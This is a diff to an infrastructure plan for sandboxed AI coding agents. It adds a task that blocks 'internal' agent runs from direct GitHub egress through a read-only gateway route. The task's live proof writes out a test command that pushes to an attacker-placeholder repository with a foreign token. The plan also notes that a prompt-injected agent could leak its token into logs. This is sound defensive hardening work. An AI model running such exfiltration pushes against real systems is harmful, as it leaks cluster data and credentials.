@@ -243,7 +243,7 @@ what it costs if it is wrong. None edits the spec; the ones worth promoting into
 | P36 | Spec §3 fallback: "the bridge relays these calls over its authenticated socket" (C5, unverified) | **The relay is not built.** Room tools rely on `agent-router` projecting `x-ar-agent` to MCP backends, which SP1 confirmed from source (P13). Task 3.11 Step 1 proves it live before anything depends on it | A relay needs a loopback MCP server in the bridge, a harness MCP configuration pointing at it (an image and a composition change) and an `mcp` SSE frame: a phase of its own | If Step 1 finds no `x-ar-agent`, phase 3 stops there. Agents cannot record handoffs or verdicts, and SC-4 and SC-14 wait for a follow-up plan that builds the relay. Phases 4–6 use no room tool (P1) and continue |
 | P37 | External reviews, 2026-09-27: SP1's gaps M2–M4, M6–M9, N3, N8 and B2 | **One PR, H-1 (`fix/agent-review-hardening`), stacked on SP1's `feat/agent-e2e` (#2111); S1 and H-S3 stack on H-1** instead of #2111 and #2110. H-1 carries M4's redaction in the harness source and bumps it to `v0.1.1`; the image that runs it is H-S3's `v0.2.0` | S3's MCPRoute edits then sit on H-1's trimmed tool lists without a conflict, and `v0.2.0` ships M4 with the footer. H-1 pins no crossplane-configuration release of SP2's, so Phase 7 stays acyclic: #2111 → H-1 → H-S3 → CC release → S1. The bump keeps H-1's merge from republishing SP1's `v0.1.0` tag | M4 is not live before phase 3's harness pre-release: until then an injected agent can print its ≤ 1 h, one-repository token into VictoriaLogs (T3) |
 | P38 | Review M1: SP1 S9 put the agents' secrets under `platform/agents/*`, and `external-secrets` reads all of `platform/` through `openbao-platform`, a ClusterSecretStore with no `conditions`, so any namespace allowed to create an `ExternalSecret` can read the agents' App key | **A kv-v2 mount of their own, `agents`**, named only by `agents-secrets` and `secrets-admin`, created with `merge-gate` (SP3 R44) in Task 1.15a, before this plan writes a new secret. [OWNER] moves `github-app`, `zai` and `factory-app` (`bao kv get` → `bao kv put -mount=agents`) and deletes the old keys once every ExternalSecret is Ready. The raft snapshot carries every mount, so a rebuild restores it with no seed. Until S1 merges in Phase 7, `aws/openbao/management` is deployed only from an `integration/agent-factory` checkout | A mount is a boundary no prefix grant elsewhere can widen: `external-secrets.hcl` grants `platform/data/*`. The review's other option, a `namespaceSelector` on `openbao-platform`, would still let every namespace it admits read the App keys | **A deploy of the management stack from `main` before S1 merges destroys both mounts and every key in them**; its preview shows `2 to destroy` first, and the recovery is a raft restore of the last snapshot. During the migration the ExternalSecrets cannot refresh for a few minutes (their Secrets are `Retain`) |
-| P39 | Reviews M2, M3: an `internal` run reads VictoriaMetrics' operator introspection, and, as an implementer, any ConfigMap, ServiceAccount or node in the cluster (`get_kubernetes_resources` over a cluster-wide ClusterRole) | H-1 removes `tsdb_status`, `active_queries` and `top_queries` from every role and `get_kubernetes_resources` from the implementer, and trims the ClusterRole of `configmaps`, `serviceaccounts`, `nodes` and `pods/log` (the first and last stay readable in `flux-system`). **No `internal` run gets a model route (SP4 PR 2) before H-1's live gate passes on `integration/agent-factory`**, and SP4 PR 2 merges after H-1 in the programme's wave | Today no `internal` run can call a model, so this surface has no reader yet; SP4 PR 2 creates one, and its output reaches pull requests on a public repository | Reviewer, tester and triager keep VictoriaLogs `query`, `hits` and `facets` over every namespace: `security`'s and other runs' log lines stay readable by an internal run. A tenant or a per-run filter is backlog |
+| P39 | Reviews M2, M3: an `internal` run reads VictoriaMetrics' operator introspection, and, as an implementer, any ConfigMap, ServiceAccount or node in the cluster (`get_kubernetes_resources` over a cluster-wide ClusterRole) | H-1 removes `tsdb_status`, `active_queries` and `top_queries` from every role and `get_kubernetes_resources` from the implementer, and trims the ClusterRole of `configmaps`, `serviceaccounts`, `nodes` and `pods/log` (the first and last stay readable in `flux-system`). **No `internal` run gets a model route (SP4 PR 2) before H-1's live gate passes on `integration/agent-factory`**, and not before R04's internal egress (no direct GitHub or profile egress, the read-only route; Task 0.5.15) passes its proof *(external review R04)*. SP4 PR 2 merges after H-1 in the programme's wave | Today no `internal` run can call a model, so this surface has no reader yet; SP4 PR 2 creates one, and its output reaches pull requests on a public repository | Reviewer, tester and triager keep VictoriaLogs `query`, `hits` and `facets` over every namespace: `security`'s and other runs' log lines stay readable by an internal run. A tenant or a per-run filter is backlog |
 | P40 | Review B2: `validate-manifests.sh` cannot run on a pre-release crossplane-configuration pin, because `gen-catalog.sh` fetches `releases/download/<ver>/xrd-crds.yaml`, which only a release publishes | **CC-H1: the pre-release job also pushes `xrd-crds.yaml` as the OCI artifact `ghcr.io/smana/crossplane-configuration-xrd-crds:<version>`**, and this repo's CI puts it in `XRD_CRDS_FILE` through `scripts/ci/fetch-xrd-crds.sh` when the pin is a pre-release. CC-S1 stacks on CC-H1, so every later CC pre-release carries it | An OCI artifact, not a GitHub pre-release asset: a pre-release creates a `v*` tag, and the pre-release job derives the next version from the newest `v*` tag. `gen-catalog.sh` keeps its single seam, the variable it already reads | One more ghcr package the owner makes public once. CC-2's own `v0.7.2-pr29.3ad168a` has no artifact, so H-1 pins CC-H1's pre-release (the same XRDs) |
 
 ## Interfaces with other sub-projects
@@ -1716,6 +1716,39 @@ Expected: `yes`, `yes`, `no`. Step 1's run reached `Succeeded`; `kubectl delete 
 then leaves `kubectl get sandbox -n agents` without it within 2 minutes.
 
 - [ ] **Step 6: H-1 out of draft** for review. It stays open until Phase 7 (P33).
+
+### Task 0.5.15: R04 — `internal` runs get no direct GitHub or profile egress (CC-H2, gateway route)
+
+External review R04 (2026-10-02): the composition opens `github` for every run whatever its
+`dataClass`, and an FQDN rule cannot see whose credentials a request carries, so an `internal` run
+could push cluster logs to an attacker's repository with a presented token (SP1 T4/T5; `npm publish`
+is the same class). An in-pod proxy cannot close it (a CNP is per pod). The gateway the run already
+reaches can. Not part of H-1 as shipped: its own crossplane-configuration PR (**CC-H2**) and a route
+on the gateway that serves the `internal` listener. If the agentgateway migration lands first, its
+plan builds the route there, once (review R14). CC-H2 joins Task 7.4's crossplane-configuration release.
+
+**Files:**
+- Modify (crossplane-configuration): `apis/agentrun/kcl/main.k` (`_profiles`, run env, credential
+  helper), `apis/agentrun/kcl/main_test.k`, the AgentRun XRD (CEL rule)
+- Create: the `github-read` route and its egress rule beside the agent router's `internal` listener
+
+- [ ] **Step 1: Composition (CC-H2).** `_profiles = [] if dataClass == "internal" else ["github"] + …`.
+  Internal runs get `GIT_CONFIG_*` env `url.http://<router>:8081/github/.insteadOf=https://github.com/`,
+  mint no GitHub token (no credential helper) and run a no-op `preStop`. XRD CEL:
+  `self.dataClass != 'internal' || !has(self.egress) || size(self.egress.profiles) == 0`.
+  Tests next to the existing CNP cases: the internal CNP has no `toFQDNs`; a profile on an internal
+  run is rejected.
+- [ ] **Step 2: Route.** HTTPRoute `github-read` on the `internal` listener only, prefix `/github/`,
+  backends `github.com:443` and `codeload.github.com:443` with TLS origination. Match `GET`/`HEAD` on
+  any path, plus `POST` on `^/github/[^/]+/[^/]+(\.git)?/git-upload-pack$`; everything else `403`.
+  A request header modifier removes `Authorization`. The gateway's egress CNP gains the two FQDNs.
+- [ ] **Step 3: [LIVE] Proof, from an `internal` tester sandbox.**
+  `git push https://x:<foreign PAT>@github.com/<attacker>/r` fails (name not resolvable); `git push`
+  through the route gets `403`; `curl -H 'Authorization: token <PAT>' …/github/…` goes out anonymous;
+  `git clone` and `git fetch origin pull/N/head` through the route work. This proof is P39's gate.
+
+Risk if wrong: anonymous reads suit public repositories only; a private target repository needs a
+token on that route, decided then.
 
 ---
 
